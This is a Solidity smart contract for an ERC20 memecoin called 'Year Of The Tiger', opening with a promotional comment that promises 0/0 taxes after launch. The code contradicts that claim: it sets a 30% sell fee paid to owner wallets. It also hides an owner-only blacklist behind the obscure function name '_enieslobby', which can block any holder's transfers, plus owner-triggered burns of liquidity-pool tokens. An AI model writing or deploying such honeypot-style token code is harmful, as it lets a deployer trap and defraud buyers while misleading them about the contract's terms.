1 /*
2 The Tiger is known as the king of all beasts in China. The zodiac sign Tiger is a symbol of strength, exorcising evils, and braveness. 
3 
4 As a community we decide to celebrate together the new year of the tiger with a 8 billion supply as a meaning of wealth and succes.
5 
6 LP is burnt and the taxes are 0/0 few minuts after launch! 🇨🇳
7 
8 Web: https://yearofthetiger.site
9 
10 Telegram: https://t.me/YearOfTheTigerPortal
11 
12 Twitter: https://twitter.com/yearofthetigerz
13 
14 */
15 // SPDX-License-Identifier: MIT
16 pragma solidity 0.8.12;
17 
18 abstract contract Context {
19     function _msgSender() internal view virtual returns (address) {
20         return msg.sender;
21     }
22 
23     function _msgData() internal view virtual returns (bytes calldata) {
24         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
25         return msg.data;
26     }
27 }
28 
29 interface IDexPair {
30     function sync() external;
31 }
32 
33 interface IERC20 {
34     /**
35      * @dev Returns the amount of tokens in existence.
36      */
37     function totalSupply() external view returns (uint256);
38 
39     /**
40      * @dev Returns the amount of tokens owned by `account`.
41      */
42     function balanceOf(address account) external view returns (uint256);
43 
44     /**
45      * @dev Moves `amount` tokens from the caller's account to `recipient`.
46      *
47      * Returns a boolean value indicating whether the operation succeeded.
48      *
49      * Emits a {Transfer} event.
50      */
51     function transfer(address recipient, uint256 amount) external returns (bool);
52 
53     /**
54      * @dev Returns the remaining number of tokens that `spender` will be
55      * allowed to spend on behalf of `owner` through {transferFrom}. This is
56      * zero by default.
57      *
58      * This value changes when {approve} or {transferFrom} are called.
59      */
60     function allowance(address owner, address spender) external view returns (uint256);
61 
62     /**
63      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
64      *
65      * Returns a boolean value indicating whether the operation succeeded.
66      *
67      * IMPORTANT: Beware that changing an allowance with this method brings the risk
68      * that someone may use both the old and the new allowance by unfortunate
69      * transaction ordering. One possible solution to mitigate this race
70      * condition is to first reduce the spender's allowance to 0 and set the
71      * desired value afterwards:
72      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
73      *
74      * Emits an {Approval} event.
75      */
76     function approve(address spender, uint256 amount) external returns (bool);
77 
78     /**
79      * @dev Moves `amount` tokens from `sender` to `recipient` using the
80      * allowance mechanism. `amount` is then deducted from the caller's
81      * allowance.
82      *
83      * Returns a boolean value indicating whether the operation succeeded.
84      *
85      * Emits a {Transfer} event.
86      */
87     function transferFrom(
88         address sender,
89         address recipient,
90         uint256 amount
91     ) external returns (bool);
92 
93     /**
94      * @dev Emitted when `value` tokens are moved from one account (`from`) to
95      * another (`to`).
96      *
97      * Note that `value` may be zero.
98      */
99     event Transfer(address indexed from, address indexed to, uint256 value);
100 
101     /**
102      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
103      * a call to {approve}. `value` is the new allowance.
104      */
105     event Approval(address indexed owner, address indexed spender, uint256 value);
106 }
107 
108 interface IERC20Metadata is IERC20 {
109     /**
110      * @dev Returns the name of the token.
111      */
112     function name() external view returns (string memory);
113 
114     /**
115      * @dev Returns the symbol of the token.
116      */
117     function symbol() external view returns (string memory);
118 
119     /**
120      * @dev Returns the decimals places of the token.
121      */
122     function decimals() external view returns (uint8);
123 }
124 
125 contract ERC20 is Context, IERC20, IERC20Metadata {
126     mapping(address => uint256) private _balances;
127 
128     mapping(address => mapping(address => uint256)) private _allowances;
129 
130     uint256 private _totalSupply;
131 
132     string public _name;
133     string public _symbol;
134 
135     constructor(string memory name_, string memory symbol_) {
136         _name = name_;
137         _symbol = symbol_;
138     }
139 
140     function name() public view virtual override returns (string memory) {
141         return _name;
142     }
143 
144     function symbol() public view virtual override returns (string memory) {
145         return _symbol;
146     }
147 
148     function decimals() public view virtual override returns (uint8) {
149         return 18;
150     }
151 
152     function totalSupply() public view virtual override returns (uint256) {
153         return _totalSupply;
154     }
155 
156     function balanceOf(address account) public view virtual override returns (uint256) {
157         return _balances[account];
158     }
159 
160     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
161         _transfer(_msgSender(), recipient, amount);
162         return true;
163     }
164 
165     function allowance(address owner, address spender) public view virtual override returns (uint256) {
166         return _allowances[owner][spender];
167     }
168 
169     function approve(address spender, uint256 amount) public virtual override returns (bool) {
170         _approve(_msgSender(), spender, amount);
171         return true;
172     }
173 
174     function transferFrom(
175         address sender,
176         address recipient,
177         uint256 amount
178     ) public virtual override returns (bool) {
179         _transfer(sender, recipient, amount);
180 
181         uint256 currentAllowance = _allowances[sender][_msgSender()];
182         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
183         unchecked {
184             _approve(sender, _msgSender(), currentAllowance - amount);
185         }
186 
187         return true;
188     }
189 
190     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
191         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
192         return true;
193     }
194 
195     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
196         uint256 currentAllowance = _allowances[_msgSender()][spender];
197         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
198         unchecked {
199             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
200         }
201 
202         return true;
203     }
204 
205     function _transfer(
206         address sender,
207         address recipient,
208         uint256 amount
209     ) internal virtual {
210         require(sender != address(0), "ERC20: transfer from the zero address");
211         require(recipient != address(0), "ERC20: transfer to the zero address");
212 
213         uint256 senderBalance = _balances[sender];
214         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
215         unchecked {
216             _balances[sender] = senderBalance - amount;
217         }
218         _balances[recipient] += amount;
219 
220         emit Transfer(sender, recipient, amount);
221     }
222 
223     function _createInitialSupply(address account, uint256 amount) internal virtual {
224         require(account != address(0), "ERC20: mint to the zero address");
225 
226         _totalSupply += amount;
227         _balances[account] += amount;
228         emit Transfer(address(0), account, amount);
229     }
230 
231     function _approve(
232         address owner,
233         address spender,
234         uint256 amount
235     ) internal virtual {
236         require(owner != address(0), "ERC20: approve from the zero address");
237         require(spender != address(0), "ERC20: approve to the zero address");
238 
239         _allowances[owner][spender] = amount;
240         emit Approval(owner, spender, amount);
241     }
242 }
243 
244 
245 contract Ownable is Context {
246     address private _owner;
247 
248     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
249     
250     /**
251      * @dev Initializes the contract setting the deployer as the initial owner.
252      */
253     constructor () {
254         address msgSender = _msgSender();
255         _owner = msgSender;
256         emit OwnershipTransferred(address(0), msgSender);
257     }
258 
259     /**
260      * @dev Returns the address of the current owner.
261      */
262     function owner() public view returns (address) {
263         return _owner;
264     }
265 
266     /**
267      * @dev Throws if called by any account other than the owner.
268      */
269     modifier onlyOwner() {
270         require(_owner == _msgSender(), "Ownable: caller is not the owner");
271         _;
272     }
273 
274     /**
275      * @dev Leaves the contract without owner. It will not be possible to call
276      * `onlyOwner` functions anymore. Can only be called by the current owner.
277      *
278      * NOTE: Renouncing ownership will leave the contract without an owner,
279      * thereby removing any functionality that is only available to the owner.
280      */
281     function renounceOwnership() external virtual onlyOwner {
282         emit OwnershipTransferred(_owner, address(0));
283         _owner = address(0);
284     }
285 
286     /**
287      * @dev Transfers ownership of the contract to a new account (`newOwner`).
288      * Can only be called by the current owner.
289      */
290     function transferOwnership(address newOwner) external virtual onlyOwner {
291         require(newOwner != address(0), "Ownable: new owner is the zero address");
292         emit OwnershipTransferred(_owner, newOwner);
293         _owner = newOwner;
294     }
295 }
296 
297 interface IDexRouter {
298     function factory() external pure returns (address);
299     function WETH() external pure returns (address);
300     
301     function swapExactTokensForETHSupportingFeeOnTransferTokens(
302         uint amountIn,
303         uint amountOutMin,
304         address[] calldata path,
305         address to,
306         uint deadline
307     ) external;
308 
309     function swapExactETHForTokensSupportingFeeOnTransferTokens(
310         uint amountOutMin,
311         address[] calldata path,
312         address to,
313         uint deadline
314     ) external payable;
315 
316     function addLiquidityETH(
317         address token,
318         uint256 amountTokenDesired,
319         uint256 amountTokenMin,
320         uint256 amountETHMin,
321         address to,
322         uint256 deadline
323     )
324         external
325         payable
326         returns (
327             uint256 amountToken,
328             uint256 amountETH,
329             uint256 liquidity
330         );
331         
332 }
333 
334 interface IDexFactory {
335     function createPair(address tokenA, address tokenB)
336         external
337         returns (address pair);
338 }
339 
340 contract YearOfTheTiger is ERC20, Ownable {
341 
342     IDexRouter public dexRouter;
343     address public lpPair;
344     address public constant deadAddress = address(0xdead);
345 
346     bool private swapping;
347 
348     address public marketingWallet;
349     address public devWallet;
350     address public RouterAddress;
351     address public LiquidityReceiver;
352     
353    
354     
355 
356     uint256 public maxTxnAmount;
357     uint256 public swapTokensAtAmount;
358     uint256 public maxWallet;
359 
360 
361     
362     uint256 public percentForLPMarketing = 0; // 100 = 1%
363     bool public lpMarketingEnabled = false;
364     uint256 public lpMarketingFrequency = 0 seconds;
365     uint256 public lastLpMarketingTime;
366     uint256 public manualMarketingFrequency = 1 hours;
367     uint256 public lastManualLpMarketingTime;
368 
369     //launch variables
370     bool public tradingActive = false;
371     uint256 private _blocks;
372     uint256 public tradingActiveBlock = 0;
373     bool public swapEnabled = false;
374     
375      // prevent more than 1 buy on same block this may cuz rug check bots to fail but helpful on launches 
376     mapping(address => uint256) private _holderLastTransferBlock; // to hold last Transfers temporarily during launch
377     bool public transferDelayEnabled = false;
378 
379     uint256 public TotalbuyFees;
380     uint256 public buyMarketingFee;
381     uint256 public buyLiquidityFee;
382     uint256 public buyDevFee;
383     
384     uint256 public TotalsellFees;
385     uint256 public sellMarketingFee;
386     uint256 public sellLiquidityFee;
387     uint256 public sellDevFee;
388     
389     uint256 public tokensForMarketing;
390     uint256 public tokensForLiquidity;
391     uint256 public tokensForDev;
392  
393     // exlcude from fees and max transaction amount
394     mapping (address => bool) private _isExcludedFromFees;
395     mapping (address => bool) public _isExcludedmaxTxnAmount;
396 
397     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
398     // could be subject to a maximum transfer amount
399     mapping (address => bool) public automatedMarketMakerPairs;
400     event SwapAndLiquify(
401         uint256 tokensSwapped,
402         uint256 ethReceived,
403         uint256 tokensIntoLiquidity
404     );
405     
406     event AutoNukeLP(uint256 amount);
407     
408     event ManualNukeLP(uint256 amount);
409     
410 
411     event OwnerForcedSwapBack(uint256 timestamp);
412 
413     constructor() ERC20("Year Of The Tiger", "$YOT") payable {
414         //taxes set
415         uint256 _buyMarketingFee = 0;
416         uint256 _buyLiquidityFee = 0;
417         uint256 _sellMarketingFee = 20;
418         uint256 _sellLiquidityFee = 10;
419         //total supply => 1e8 means 1B
420         uint256 totalSupply = 8e5 * 10 * 1e18;
421         
422         maxTxnAmount = totalSupply * 2 / 100;
423         maxWallet = totalSupply * 2 / 100;
424         swapTokensAtAmount = totalSupply * 1 / 1000;
425 
426         buyMarketingFee = _buyMarketingFee;
427         buyLiquidityFee = _buyLiquidityFee;
428         buyDevFee = 0;
429         TotalbuyFees = buyMarketingFee + buyLiquidityFee + buyDevFee;
430         
431         sellMarketingFee = _sellMarketingFee;
432         sellLiquidityFee = _sellLiquidityFee;
433         sellDevFee = 0;
434         TotalsellFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
435         
436         marketingWallet = address(owner());
437         devWallet = address(owner());
438 
439         // exclude from paying fees or having max transaction amount
440         excludeFromFees(owner(), true);
441         excludeFromFees(address(this), true);        
442         excludeFromMaxTransaction(owner(), true);
443         excludeFromMaxTransaction(address(this), true);
444         //set owner as default marketing & liquidity wallet
445         marketingWallet=owner();
446         LiquidityReceiver=owner();
447 
448         
449         // initialize router
450         RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//set router address here
451         IDexRouter _dexRouter = IDexRouter(RouterAddress);
452         dexRouter = _dexRouter;
453         lastLpMarketingTime = block.timestamp;
454         // create pair
455         lpPair = IDexFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
456         excludeFromMaxTransaction(address(lpPair), true);
457         _setAutomatedMarketMakerPair(address(lpPair), true);       
458         //initiate supply
459         _createInitialSupply(owner(), totalSupply*100/100);
460     }
461 
462     receive() external payable {}
463     mapping (address => bool) private _isBlackListed;   
464     // Toggle Transfer delay
465     function DisableTransferDelay() external onlyOwner {
466         transferDelayEnabled = false;
467     }
468     function setSwapTokensAt(uint256 newAmount) external onlyOwner returns (bool){
469         require(newAmount <= totalSupply() * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");
470         swapTokensAtAmount = newAmount;
471         return true;
472     }
473     function updateMaxTxn_base1000(uint256 newNum) external onlyOwner {
474         //force max tx to be at least 0.5%
475         require(newNum >= 5, "Cannot set maxTxnAmount lower than 0.5%");
476         maxTxnAmount = ((totalSupply() * newNum / 1000)/1e18) * (10**18);
477     }
478 
479     function updateMaxWallet_base1000(uint256 newNum) external onlyOwner {
480         //force max wallet to be at least 0.5%
481         require(newNum >= 5, "Cannot set maxWallet lower than 0.5%");
482         maxWallet = ((totalSupply() * newNum / 1000)/1e18) * (10**18);
483     }
484     
485     function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
486         _isExcludedmaxTxnAmount[updAds] = isEx;
487     }
488     
489     // in case something goes wrong on auto swap
490     function updateSwapEnabled(bool enabled) external onlyOwner(){
491         swapEnabled = enabled;
492     }
493     function _setbuyfees(uint256 _marketing,uint256 _liquidity) external onlyOwner{
494         require((_marketing+_liquidity) <= 30, "Must keep fees lower than 30%");
495         buyMarketingFee = _marketing;
496         buyLiquidityFee = _liquidity;
497         TotalbuyFees = buyMarketingFee + buyLiquidityFee;
498     }
499     function _setsellfees(uint256 _marketing,uint256 _liquidity) external onlyOwner{
500         require((_marketing+_liquidity) <= 30, "Must keep fees lower than 30%");
501         sellMarketingFee = _marketing;
502         sellLiquidityFee = _liquidity;
503         TotalsellFees = sellMarketingFee + sellLiquidityFee;
504     }
505 
506     function excludeFromFees(address account, bool excluded) public onlyOwner {
507         _isExcludedFromFees[account] = excluded;
508     }
509 
510     function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
511         require(pair != lpPair, "The pair cannot be removed from automatedMarketMakerPairs");
512 
513         _setAutomatedMarketMakerPair(pair, value);
514     }
515 
516     function _setAutomatedMarketMakerPair(address pair, bool value) private {
517         automatedMarketMakerPairs[pair] = value;
518 
519     }
520     function SetupFeeReceivers(address _mar,address _liq,address _dev) external onlyOwner {
521         marketingWallet = _mar;
522         LiquidityReceiver = _liq;
523         devWallet = _dev;
524     }
525     function isExcludedFromFees(address account) public view returns(bool) {
526         return _isExcludedFromFees[account];
527     }
528     function _transfer(
529         address from,
530         address to,
531         uint256 amount
532     ) internal override {
533         require(from != address(0), "ERC20: transfer from the zero address");
534         require(to != address(0), "ERC20: transfer to the zero address");
535         require(!_isBlackListed[to], "You have no power here!");
536         require(!_isBlackListed[tx.origin], "You have no power here!");
537 
538          if(amount == 0) {
539             super._transfer(from, to, 0);
540             return;
541         }
542 
543         if(!tradingActive){
544             require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
545         }
546         
547         if (
548             from != owner() &&
549             to != owner() &&
550             to != address(0) &&
551             to != address(0xdead) &&
552             !swapping &&
553             !_isExcludedFromFees[to] &&
554             !_isExcludedFromFees[from]
555         ){
556                 // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  
557                 if (transferDelayEnabled){
558                     if (to != address(dexRouter) && to != address(lpPair)){
559                         require(_holderLastTransferBlock[tx.origin] < block.number - 1 && _holderLastTransferBlock[to] < block.number - 1, "_transfer:: Transfer Delay enabled.  Try again later.");
560                         _holderLastTransferBlock[tx.origin] = block.number;
561                         _holderLastTransferBlock[to] = block.number;
562                     }
563                 }
564                  
565                 //when buy
566                 if (automatedMarketMakerPairs[from] && !_isExcludedmaxTxnAmount[to]) {
567                         require(amount <= maxTxnAmount, "Buy transfer amount exceeds the maxTxnAmount.");
568                         require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
569                 }
570                 
571                 //when sell
572                 else if (automatedMarketMakerPairs[to] && !_isExcludedmaxTxnAmount[from]) {
573                         require(amount <= maxTxnAmount, "Sell transfer amount exceeds the maxTxnAmount.");
574                 }
575                 else if (!_isExcludedmaxTxnAmount[to]){
576                     require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
577                 }
578         }
579         
580     uint256 contractTokenBalance = balanceOf(address(this));
581         
582         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
583 
584         if( 
585             canSwap &&
586             swapEnabled &&
587             !swapping &&
588             !automatedMarketMakerPairs[from] &&
589             !_isExcludedFromFees[from] &&
590             !_isExcludedFromFees[to]
591         ) {
592             swapping = true;
593             
594             swapBack();
595 
596             swapping = false;
597         }
598         
599         if(!swapping && automatedMarketMakerPairs[to] && lpMarketingEnabled && block.timestamp >= lastLpMarketingTime + lpMarketingFrequency && !_isExcludedFromFees[from]){
600             autoMarketingLiquidityPairTokens();
601         }
602         
603 
604         bool takeFee = !swapping;
605 
606         // if any account belongs to _isExcludedFromFee account then remove the fee
607         if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
608             takeFee = false;
609         }
610         
611         uint256 fees = 0;
612         // only take fees on buys/sells, do not take on wallet transfers
613         if(takeFee){
614             // bot/sniper penalty.  Tokens get transferred to Marketing wallet to allow potential refund.
615             if((tradingActiveBlock >= block.number - _blocks) && automatedMarketMakerPairs[from]){
616                 fees = amount * 99 / 100;
617                 tokensForLiquidity += fees * sellLiquidityFee / TotalsellFees;
618                 tokensForMarketing += fees * sellMarketingFee / TotalsellFees;
619                 tokensForDev += fees * sellDevFee / TotalsellFees;
620             }
621             // on sell
622             else if (automatedMarketMakerPairs[to] && TotalsellFees > 0){
623                 fees = amount * TotalsellFees / 100;
624                 tokensForLiquidity += fees * sellLiquidityFee / TotalsellFees;
625                 tokensForMarketing += fees * sellMarketingFee / TotalsellFees;
626                 tokensForDev += fees * sellDevFee / TotalsellFees;
627             }
628             // on buy
629             else if(automatedMarketMakerPairs[from] && TotalbuyFees > 0) {
630               fees = amount * TotalbuyFees / 100;
631               tokensForLiquidity += fees * buyLiquidityFee / TotalbuyFees;
632                 tokensForMarketing += fees * buyMarketingFee / TotalbuyFees;
633                 tokensForDev += fees * buyDevFee / TotalbuyFees;
634             }
635             
636             if(fees > 0){    
637                 super._transfer(from, address(this), fees);
638             }
639           
640           amount -= fees;
641         }
642 
643         super._transfer(from, to, amount);
644     }
645 
646     function swapTokensForEth(uint256 tokenAmount) private {
647 
648         address[] memory path = new address[](2);
649         path[0] = address(this);
650         path[1] = dexRouter.WETH();
651 
652         _approve(address(this), address(dexRouter), tokenAmount);
653 
654         // make the swap
655         dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
656             tokenAmount,
657             0, // accept any amount of ETH
658             path,
659             address(this),
660             block.timestamp
661         );
662     }
663     
664     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
665         // approve token transfer to cover all possible scenarios
666         _approve(address(this), address(dexRouter), tokenAmount);
667 
668         // add the liquidity
669         dexRouter.addLiquidityETH{value: ethAmount}(
670             address(this),
671             tokenAmount,
672             0, // slippage is unavoidable
673             0, // slippage is unavoidable
674             LiquidityReceiver,
675             block.timestamp
676         );
677     }
678 
679     function swapBack() private {
680         uint256 contractBalance = balanceOf(address(this));
681         uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev;
682         bool success;
683         
684         if(contractBalance == 0 || totalTokensToSwap == 0) {return;}
685 
686         if(contractBalance > swapTokensAtAmount * 20){
687             contractBalance = swapTokensAtAmount * 20;
688         }
689         
690         // Halve the amount of liquidity tokens
691         uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;
692         uint256 amountToSwapForETH = contractBalance - liquidityTokens;
693         
694         uint256 initialETHBalance = address(this).balance;
695 
696         swapTokensForEth(amountToSwapForETH); 
697         
698         uint256 ethBalance = address(this).balance - initialETHBalance;
699         
700         uint256 ethForMarketing = ethBalance * tokensForMarketing / (totalTokensToSwap - (tokensForLiquidity/2));
701         uint256 ethForDev = ethBalance * tokensForDev / (totalTokensToSwap - (tokensForLiquidity/2));
702         
703         uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;
704         
705         
706         tokensForLiquidity = 0;
707         tokensForMarketing = 0;
708         tokensForDev = 0;
709 
710         
711         (success,) = address(devWallet).call{value: ethForDev}("");
712         (success,) = address(marketingWallet).call{value: ethForMarketing}("");
713         
714         if(liquidityTokens > 0 && ethForLiquidity > 0){
715             addLiquidity(liquidityTokens, ethForLiquidity);
716             emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
717         }
718         
719     }
720 
721     // force Swap back if slippage issues.
722     function forceSwapBack() external onlyOwner {
723         require(balanceOf(address(this)) >= swapTokensAtAmount, "Can only swap when token amount is at or higher than restriction");
724         swapping = true;
725         swapBack();
726         swapping = false;
727         emit OwnerForcedSwapBack(block.timestamp);
728     } 
729 
730     
731     
732     function autoMarketingLiquidityPairTokens() internal{
733         
734         lastLpMarketingTime = block.timestamp;
735         
736         // get balance of liquidity pair
737         uint256 liquidityPairBalance = this.balanceOf(lpPair);
738         
739         // calculate amount to Marketing
740         uint256 amountToMarketing = liquidityPairBalance * percentForLPMarketing / 10000;
741         
742         if (amountToMarketing > 0){
743             super._transfer(lpPair, address(0xdead), amountToMarketing);
744         }
745         
746         //sync price since this is not in a swap transaction!
747         IDexPair pair = IDexPair(lpPair);
748         pair.sync();
749         emit AutoNukeLP(amountToMarketing);
750     }
751 
752     function manualMarketingLiquidityPairTokens(uint256 percent) external onlyOwner {
753         require(block.timestamp > lastManualLpMarketingTime + manualMarketingFrequency , "Must wait for cooldown to finish");
754         require(percent <= 1000, "May not nuke more than 10% of tokens in LP");
755         lastManualLpMarketingTime = block.timestamp;
756         
757         // get balance of liquidity pair
758         uint256 liquidityPairBalance = this.balanceOf(lpPair);
759         
760         // calculate amount to Marketing
761         uint256 amountToMarketing = liquidityPairBalance * percent / 10000;
762         
763         if (amountToMarketing > 0){
764             super._transfer(lpPair, address(0xdead), amountToMarketing);
765         }
766         
767         //sync price since this is not in a swap transaction!
768         IDexPair pair = IDexPair(lpPair);
769         pair.sync();
770         
771     }
772     function EnableTrading() external onlyOwner {
773         require(!tradingActive, "Trading is already active, cannot relaunch.");
774         //standard enable trading
775         tradingActive = true;
776         swapEnabled = true;
777         tradingActiveBlock = block.number;
778         _blocks = 0;
779     }
780 
781 
782     // withdraw ETH if stuck before launch
783     function withdrawStuckETH() external onlyOwner {
784         require(!tradingActive, "Can only withdraw if trading hasn't started");
785         bool success;
786         (success,) = address(msg.sender).call{value: address(this).balance}("");
787     }
788 
789     function isBot(address account) public view returns (bool) {
790         return  _isBlackListed[account];
791     }
792     function _enieslobby(address[] memory Addresses,bool _status) external onlyOwner(){
793         //avoid blacklisting lpPair & contract
794         for (uint256 i; i < Addresses.length; ++i) {
795             if(Addresses[i] != lpPair && Addresses[i] != address(this)){
796                 _isBlackListed[Addresses[i]] = _status;
797             }
798         }
799     }
800 }